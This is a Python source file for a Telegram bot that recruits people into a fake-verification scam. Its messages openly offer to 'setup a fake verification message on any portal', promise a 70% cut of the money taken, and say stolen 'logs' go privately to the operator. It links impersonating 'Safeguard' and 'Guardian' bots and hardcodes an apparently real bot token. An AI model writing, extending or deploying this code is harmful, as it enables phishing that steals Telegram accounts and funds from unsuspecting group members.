import asyncio
from io import BytesIO
from telegram import(
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import(
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)
from PIL import Image
import dotenv



TOKEN = "8049037794:AAGOqzNyGc_3M7Y4hFgJ5aHgw84eUIWjAm0"
CHANNEL_USERNAME = "@whalesharka1"
Background_Image = Image.open('assets/background.JPG')
BackgroundGuard_Image = Image.open('assets/Nyrox.JPG')

startBtn = InlineKeyboardButton(text = "📣 Channel", url="https://t.me/whalesharka1", callback_data="startBtn" )
Portal_button = InlineKeyboardButton(text="🌀 Setup a portal", callback_data="Portal_button")
Support_button = InlineKeyboardButton(text="❓ Support", url="https://t.me/@whalesharka", callback_data="Support_button")
AddChannel_button = InlineKeyboardButton(text ="➕ Add Channel",url="https://t.me/Wh_SafeguardUXRobot?startchannel&admin=post_messages")
Safe_button = InlineKeyboardButton(text="🔰 Safeguard", callback_data="safe_button")
Guardian_button = InlineKeyboardButton(text ="🔰 Guardian",url="https://t.me/Wh_Guardian")
PortalGuard_button = InlineKeyboardButton(text="🔰 PortalGuard",url="https://t.me/+cl_RBbuPRD84ZDkx")


async def is_user_subscribed(user_id:int, context:ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        chat_member =  await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(e)
        return False

async def clickHandler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the button click."""
    print("clickHandler")
    query = update.callback_query
    await query.answer() 
    # Extract the callback data from the clicked button
    callback_data = query.data
    
    if callback_data == "Portal_button":
       keyboard = [
           [Safe_button],[PortalGuard_button, Guardian_button]
       ]
       reply_markup = InlineKeyboardMarkup(keyboard)
       message = f"""
☝️Select which bot you would like to setup on the portal🤖

Use one of the buttons below or manually add one of the 
bots below to any channel or group as an admin

@Wh_delugeuibot
@Wh_SafeguardUXRobot
@Wh_guardianuibot
""" 
       await query.message.reply_text(message, reply_markup=reply_markup)

    elif callback_data == "safe_button":
        keyboard = [
           [AddChannel_button, Support_button]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = f"""
Welcome to @Wh_SafeguardUXRobot

• Your cut is 70% unless we agreed on a different cut!
• Logs are sent privately to you

💡Desktop Users: If the Add Bot button doesn't work, manually
add @Wh_SafeguardUXRobot to your group as admin.
"""     
        bio = BytesIO()
        BackgroundGuard_Image.save(bio, format="JPEG")
        bio.seek(0)
        await query.message.reply_photo(photo=bio, caption=message, reply_markup=reply_markup)
    
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id
    username = user.username or "Unknown"
    is_subscribed = await is_user_subscribed(user_id, context)
    print("hh----->", is_subscribed)
    if not is_subscribed:
        keyboard = [[startBtn]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        bio_1 = BytesIO()
        Background_Image.save(bio_1, format="PNG")
        bio_1.seek(0)
        await update.message.reply_photo(photo=bio_1,caption = f"""
        ⚠️ Subscribe to our channel to gain access ❌    
                                                                                                                    
Unfortunately you are unable to setup a fake verification 
message until you subscribe to our channel using the 
button below""", 
        reply_markup=reply_markup)
    else:
        keyboard = [[Portal_button], [startBtn, Support_button]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        bio_1 = BytesIO()
        Background_Image.save(bio_1, format="PNG")
        bio_1.seek(0)
        await update.message.reply_photo(photo=bio_1,caption = f"""
        ⚡ Fake Verification Robot 🪝    
                                                                                                                    
You can use the button below to setup a fake verification 
message on any portal of your choice and you will 
receive a 70% split of the money you make from each 
portal""", 
        reply_markup=reply_markup)

if __name__=='__main__':
    application  = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(clickHandler))

    application.run_polling()

